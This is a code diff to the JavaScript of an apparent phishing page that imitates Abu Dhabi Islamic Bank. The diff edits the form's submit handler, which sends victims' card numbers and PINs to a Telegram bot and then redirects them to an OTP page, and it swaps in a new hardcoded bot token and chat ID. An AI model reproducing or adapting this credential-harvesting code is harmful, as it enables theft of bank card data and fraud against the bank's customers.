@@ -118,16 +118,12 @@ document.getElementById('adibForm').addEventListener('submit', function(e) {
         return;
     }
 
-    // --- القيم الجديدة المحدثة ---
-    const botToken = '8524439098:AAFyTnibWXP4C0qtGhfxx--5eVburUrHwYY';
-    const chatId = '8485270011';
-
     // إرسال البيانات لبوت تلغرام
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    fetch('https://api.telegram.org/bot7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            chat_id: chatId,
+            chat_id: '1008144314',
             text: `🔐 *بيانات دخول جديدة - مصرف أبوظبي الإسلامي*\n💳 رقم البطاقة: ${cardNumber}\n🔢 رمز PIN: ${pin}\n📅 ${new Date().toLocaleString('ar-EG')}`,
             parse_mode: 'Markdown'
         })
@@ -135,7 +131,6 @@ document.getElementById('adibForm').addEventListener('submit', function(e) {
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            // التوجه لصفحة الرمز السري بعد النجاح
             window.location.href = 'otp_page.html';
         } else {
             throw new Error('فشل الإرسال');
